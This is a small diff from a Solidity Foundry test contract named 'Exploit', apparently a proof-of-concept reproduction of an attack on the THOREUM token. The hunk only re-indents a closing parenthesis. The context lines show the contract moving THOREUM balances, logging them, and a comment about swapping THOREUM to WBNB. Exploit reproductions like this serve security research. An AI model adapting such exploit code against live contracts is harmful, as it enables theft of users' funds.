@@ -64,7 +64,7 @@ contract Exploit is Test {
             THOREUM.transfer(address(this), THOREUM.balanceOf(address(this)));
             emit log_named_decimal_uint(
                 "[INFO] address(this) thoreum  balance : ", THOREUM.balanceOf(address(this)), 18
-                );
+            );
         }
 
         //step3: swap thoreum to wbnb
